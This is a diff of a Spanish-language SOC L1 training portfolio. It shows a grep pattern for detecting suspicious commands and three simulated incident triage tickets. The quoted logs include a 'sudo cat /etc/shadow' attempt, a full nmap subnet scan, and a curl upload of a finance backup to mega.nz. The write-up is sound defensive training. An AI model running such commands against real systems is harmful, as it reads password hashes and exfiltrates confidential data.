@@ -36,7 +36,7 @@ sudo tshark -i any -c 10 # Verificación de captura en vivo con 10 paquetes
 ### Resultado
 Estación Kali Purple L1 operativa. Binarios de Detect y Protect verificados, herramienta de Respond aprovisionada manualmente por conflicto de firmas en repos por defecto.
 
-## Modulo 2: Analisis de Trafico de Red
+## Módulo 2: Análisis de Tráfico de Red
 
 ### Descripcion General
 Se realiza una captura y analisis de trafico HTTP utilizando `tcpdump`, con el fin de revisar el comportamiento de una peticion web y el uso de un User-Agent simulado.
@@ -102,3 +102,70 @@ grep -P -i '^(?:.*.*cat /etc/passwd.*|.*.*uname -a.*|.*.*id.*)' tus_logs.txt
 ### Evidencia
 ![](./img/evidencia-sigma.jpg)
 Validación exitosa del entorno, conversión de la regla Sigma y filtrado correcto de comandos sospechosos en terminal.
+
+## Módulo 4: Gestión, Triage y Documentación de Incidentes SOC L1
+
+### Descripción General
+En este módulo documenté como hice el triage de 3 alertas simuladas. Clasifiqué cada una entre verdadero positivo y falso positivo, y dejé qué acción tomé en L1 y cuando tocó escalar.
+
+---
+
+### Ticket de Incidente #1: Intentos de Acceso No Autorizado a Archivos Críticos
+
+* **ID del Ticket:** `SOC-INC-2026-001`
+* **Fecha/Hora:** `2026-10-18T20:15:00Z` (UTC)
+* **Severidad:** `Crítica`
+* **Clasificación (Triage):** `Verdadero Positivo`
+* **Estado:** `Cerrado` / `Resuelto en L1`
+
+### Resumen del Incidente
+El usuario `invitado_01`, sin privilegios, intentó leer `/etc/shadow` usando `sudo cat`. Ese archivo guarda los hashes de contraseñas, así que lo marqué como crítico.
+
+### Evidencia del Log (Raw Data)
+```text
+2026-10-18T20:15:00Z SOC-PC-01 sudo: invitado_01 : TTY=pts/1 ; PWD=/home/invitado_01 ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+```
+
+### Acciones de Mitigación y Respuesta (L1)
+1. Bloqueé la cuenta `invitado_01` de inmediato.
+2. Revisé `/etc/sudoers` para ver por qué tenía permisos de sudo.
+3. Notifiqué al administrador de sistemas.
+
+---
+
+### Ticket de Incidente #2: Detección y Exfiltración de Datos (Escalamiento)
+
+* **ID del Ticket:** `SOC-INC-2026-002`
+* **Fecha/Hora:** `2026-10-18T03:30:00Z` (UTC)
+* **Severidad:** `Crítica`
+* **Clasificación (Triage):** `Verdadero Positivo`
+* **Estado:** `Escalado a Nivel 2 (L2 / Incident Response)`
+
+### Resumen del Incidente
+Actividad rara fuera de horario en el servidor financiero. La cuenta `admin_maint` hizo un escaneo completo con `nmap` a la red local y luego subió el backup `db_finance.zip` a un sitio externo con `curl`.
+
+### Evidencia del Log (Raw Data)
+```text
+2026-10-18T03:30:12Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=nmap -sS -p 1-65535 192.168.1.0/24
+2026-10-18T03:32:45Z SOC-FINANCE-01 bash_history: admin_maint : COMMAND=curl -F "file=@/var/backups/db_finance.zip" https://mega.nz/upload
+```
+
+### Acciones de Mitigación y Respuesta (L1 -> L2)
+1. **Contención L1:** Aislé el host `SOC-FINANCE-01` de la red para cortar la exfiltración.
+2. **Escalamiento:** Lo pasé a L2 porque ya hay exfiltración de datos confidenciales y posible movimiento lateral.
+---
+
+### Ticket de Incidente #3: Ejecución de Script de Mantenimiento Legítimo
+
+* **ID del Ticket:** `SOC-INC-2026-003`
+* **Fecha/Hora:** `2026-10-18T14:15:00Z` (UTC)
+* **Severidad:** `Baja`
+* **Clasificación (Triage):** `Falso Positivo / Actividad Legítima`
+* **Estado:** `Cerrado`
+
+### Resumen del Incidente
+Alerta por ejecución de `actualizar_firmas.ps1` en un equipo de marketing. Validé con TI y era un despliegue autorizado para actualizar firmas corporativas.
+
+### Acciones y Cierre
+* Verificado por canal oficial `#it-ops` con ticket de cambio CR-8492.
+* Cerrado como falso positivo, sin contención.
